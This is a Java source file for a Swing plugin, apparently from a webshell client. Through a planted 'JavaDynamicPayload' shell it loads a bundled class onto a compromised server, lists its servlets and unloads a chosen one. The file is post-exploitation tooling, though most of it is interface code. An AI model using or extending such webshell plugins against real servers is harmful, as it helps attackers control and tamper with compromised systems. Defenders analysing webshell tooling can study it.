package vip.youwe.shell.shells.plugins.java;

import vip.youwe.shell.core.Encoding;
import vip.youwe.shell.core.annotation.PluginnAnnotation;
import vip.youwe.shell.core.imp.Payload;
import vip.youwe.shell.core.imp.Plugin;
import vip.youwe.shell.core.shell.ShellEntity;
import vip.youwe.shell.core.ui.component.GBC;
import vip.youwe.shell.core.ui.component.RTextArea;
import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.automaticBindClick;
import vip.youwe.shell.utils.functions;
import vip.youwe.shell.utils.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.io.InputStream;

@PluginnAnnotation(payloadName = "JavaDynamicPayload", Name = "ServletManage")
public class ServletManage implements Plugin {

    private static final String CLASS_NAME = "plugin.ServletManage";
    private JPanel panel;
    private JButton getAllServletButton;
    private JButton unLoadServletButton;
    private JSplitPane splitPane;
    private RTextArea resultTextArea;
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public ServletManage() {
        this.panel = new JPanel(new BorderLayout());
        this.getAllServletButton = new JButton("GetAllServlet");
        this.unLoadServletButton = new JButton("UnLoadServlet");
        this.resultTextArea = new RTextArea();
        this.splitPane = new JSplitPane();

        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);

        JPanel topPanel = new JPanel();

        topPanel.add(this.getAllServletButton);
        topPanel.add(this.unLoadServletButton);

        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));

        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                ServletManage.this.splitPane.setDividerLocation(0.15D);
            }
        });

        this.panel.add(this.splitPane);
    }


    private void getAllServletButtonClick(ActionEvent actionEvent) {
        this.resultTextArea.setText(getAllServlet());
    }

    private void unLoadServletButtonClick(ActionEvent actionEvent) {
        UnServlet unServlet = new UnLoadServletDialog(this.shellEntity.getFrame(),
                "UnLoadServlet", "", "").getResult();
        if (unServlet.state) {
            String resultString = unLoadServlet(unServlet.wrapperName, unServlet.urlPattern);
            Log.log(resultString);
            JOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
        } else {
            Log.log("用户取消选择.....");
        }
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/ServletManage.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success");
                } else {
                    Log.log("Load fail");
                }
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    private String getAllServlet() {
        load();
        byte[] resultByteArray = this.payload.evalFunc(CLASS_NAME, "getAllServlet", new ReqParameter());
        return this.encoding.Decoding(resultByteArray);
    }

    private String unLoadServlet(String wrapperName, String urlPattern) {
        load();
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("wrapperName", wrapperName);
        reqParameter.add("urlPattern", urlPattern);
        byte[] resultByteArray = this.payload.evalFunc(CLASS_NAME, "unLoadServlet", reqParameter);
        return this.encoding.Decoding(resultByteArray);
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }

    class UnLoadServletDialog extends JDialog {

        private JTextField wrapperNameTextField;
        private JTextField urlPatternTextField;
        private JLabel wrapperNameLabel;
        private JLabel urlPatternLabel;
        private JButton okButton;
        private JButton cancelButton;
        private UnServlet unServlet;
        private Dimension TextFieldDim;

        private UnLoadServletDialog(Frame frame, String tipString,
                                    String wrapperNameString, String urlPatternString) {
            super(frame, tipString, true);
            this.unServlet = new UnServlet();
            this.TextFieldDim = new Dimension(500, 23);

            this.wrapperNameTextField = new JTextField("wrapperNameText", 30);
            this.urlPatternTextField = new JTextField("destText", 30);
            this.wrapperNameLabel = new JLabel("wrapperName");
            this.urlPatternLabel = new JLabel("urlPattern");

            this.okButton = new JButton("unLoad");
            this.cancelButton = new JButton("cancel");
            Dimension TextFieldDim = new Dimension(200, 23);

            GBC gbcLSrcFile = (new GBC(0, 0)).setInsets(5, -40, 0, 0);
            GBC gbcSrcFile = (new GBC(1, 0, 3, 1)).setInsets(5, 20, 0, 0);
            GBC gbcLDestFile = (new GBC(0, 1)).setInsets(5, -40, 0, 0);
            GBC gbcDestFile = (new GBC(1, 1, 3, 1)).setInsets(5, 20, 0, 0);
            GBC gbcOkButton = (new GBC(0, 2, 2, 1)).setInsets(5, 20, 0, 0);
            GBC gbcCancelButton = (new GBC(2, 2, 1, 1)).setInsets(5, 20, 0, 0);

            this.wrapperNameTextField.setPreferredSize(TextFieldDim);
            this.urlPatternTextField.setPreferredSize(TextFieldDim);

            setLayout(new GridBagLayout());
            add(this.wrapperNameLabel, gbcLSrcFile);
            add(this.wrapperNameTextField, gbcSrcFile);
            add(this.urlPatternLabel, gbcLDestFile);
            add(this.urlPatternTextField, gbcDestFile);
            add(this.okButton, gbcOkButton);
            add(this.cancelButton, gbcCancelButton);
            automaticBindClick.bindJButtonClick(this, this);
            addWindowListener(new WindowListener() {
                public void windowOpened(WindowEvent paramWindowEvent) {
                }

                public void windowIconified(WindowEvent paramWindowEvent) {
                }

                public void windowDeiconified(WindowEvent paramWindowEvent) {
                }

                public void windowDeactivated(WindowEvent paramWindowEvent) {
                }

                public void windowClosing(WindowEvent paramWindowEvent) {
                    UnLoadServletDialog.this.cancelButtonClick(null);
                }

                public void windowClosed(WindowEvent paramWindowEvent) {
                }

                public void windowActivated(WindowEvent paramWindowEvent) {
                }
            });
            this.wrapperNameTextField.setText(wrapperNameString);
            this.urlPatternTextField.setText(urlPatternString);

            setSize(650, 180);
            setLocationRelativeTo(frame);
            setDefaultCloseOperation(2);
            setVisible(true);
        }

        public ServletManage.UnServlet getResult() {
            return this.unServlet;
        }

        private void okButtonClick(ActionEvent actionEvent) {
            this.unServlet.state = true;
            changeFileInfo();
        }

        private void cancelButtonClick(ActionEvent actionEvent) {
            this.unServlet.state = false;
            changeFileInfo();
        }

        private void changeFileInfo() {
            this.unServlet.urlPattern = this.urlPatternTextField.getText();
            this.unServlet.wrapperName = this.wrapperNameTextField.getText();
            dispose();
        }
    }

    class UnServlet {
        public boolean state;
        public String wrapperName;
        public String urlPattern;
    }

}
